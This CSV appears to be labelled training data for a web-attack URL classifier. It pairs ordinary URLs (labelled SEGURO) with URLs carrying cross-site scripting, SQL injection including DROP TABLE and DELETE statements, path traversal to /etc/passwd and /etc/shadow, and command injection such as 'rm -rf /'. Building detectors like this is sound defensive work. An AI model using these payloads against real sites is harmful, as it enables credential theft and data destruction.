urls,label
http://example.com/search?q=<script>alert('XSS')</script>,XSS
http://example.com/view.php?id=<img src='x' onerror='alert(1)'>,XSS
http://vulnerable-site.com/login?username=<script>alert('hack')</script>&xsspassword=1234,XSS
http://example.com/?name=<svg/onload=alert('XSS')>,XSS
http://example.com/comment?text=<iframe src="javascript:alert('XSS')"></iframe>,XSS
http://example.com/product?id=1' OR '1'='1,SQLI
http://example.com/login?username=admin'--&password=password,SQLI
http://example.com/search?q='; DROP TABLE users; --,SQLI
http://example.com/article?id=10;SELECT * FROM users WHERE '1'='1,SQLI
http://example.com/products.php?category=electronics%20OR%201=1,SQLI
http://example.com/index.php?page=../../../../etc/passwd,LFI
http://example.com/download.php?file=../../config.php,LFI
http://vulnerable-site.com/page?file=../../../../../windows/system32/drivers/etc/hosts,LFI
http://example.com/template.php?path=../../../../../../var/log/auth.log,LFI
http://example.com/view?doc=../../../../../etc/shadow,LFI
http://example.com/exec?cmd=ls,CommandI
http://example.com/ping?host=google.com;cat%20/etc/passwd,CommandI
http://vulnerable-site.com/?cmd=ping%20127.0.0.1;rm%20-rf%20/,CommandI
http://example.com/shell?command=whoami;uname -a,CommandI
http://example.com/exec?input=ping -c 4 google.com; cat /etc/passwd,CommandI
http://example.com/home,SEGURO
http://example.com/search?q=product,SEGURO
http://example.com/contact,SEGURO
http://secure-website.com/about,SEGURO
http://secure-website.com/products?id=25,SEGURO
http://example.com/article?id=10,SEGURO
http://trusted-site.com/blog?post=5,SEGURO
http://example.com/login?username=user&password=securepass123,SEGURO
http://example.com/shop/category/electronics,SEGURO
http://trusted-site.com/services/contact,SEGURO
http://example.com/admin?user=<script>alert('1')</script>,XSS
http://testsite.com/forum?comment=<img src="x" onerror="alert(2)">,XSS
http://example.com/shop?item=<svg/onload=alert('XSS')>,XSS
http://example.com/search?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E,XSS
http://vulnerable.com/profile.php?user=<img src=x onerror=alert(3)>,XSS
http://example.com/post?id=1'; DROP TABLE comments; --,SQLI
http://vulnerable-site.com/search?term='; DELETE FROM users; --,SQLI
http://example.com/login?username=admin' AND 1=1--&password=pass123,SQLI
http://example.com/view.php?id=5 OR 1=1,SQLI
http://testsite.com/index?id=1 UNION SELECT * FROM users,SQLI
http://example.com/index.php?file=../../../../etc/hosts,LFI
http://example.com/download.php?path=../../../../../../etc/passwd,LFI
http://vulnerable.com/show.php?file=.t.ini,LFI
http://example.com/serve.php?doc=../../../../../../usr/local/data,LFI
http://example.com/open.php?file=../../../../etc/group,LFI
http://example.com/cmd?exec=cat%20/etc/shadow,CommandI
http://example.com/ping?ip=127.0.0.1;cat%20/etc/passwd,CommandI
http://example.com/execute?command=ping -c 4 localhost,CommandI
http://vulnerable.com/command?run=ls -al /,CommandI
http://example.com/run?exec=rm -rf /home/user/,CommandI
http://secure-site.com/aboutus,SEGURO
http://trusted-site.com/products/item?id=10,SEGURO
http://example.com/login,SEGURO
http://secure.com/support,SEGURO
http://example.com/view?id=15&lang=en,SEGURO
http://safe-site.com/download?file=document.pdf,SEGURO
http://example.com/services?category=design,SEGURO
http://trusted.com/shop?item=laptop,SEGURO
http://example.com/profile?user=12345,SEGURO
http://trusted.com/checkout?orderid=98765,SEGURO
http://testsite.com/?search=<script>alert('XSS Attack')</script>,XSS
http://example.com/comment?message=<svg/onload=alert('Hacked')>,XSS
http://example.com/profile.php?user=<iframe src="javascript:alert('XSS')"></iframe>,XSS
http://vulnerable.com/view?id=<img src='x' onerror='alert(0)'>,XSS
http://example.com/login?redirect=<script>alert(document.cookie)</script>,XSS
http://example.com/login?username=admin' OR '1'='1,SQLI
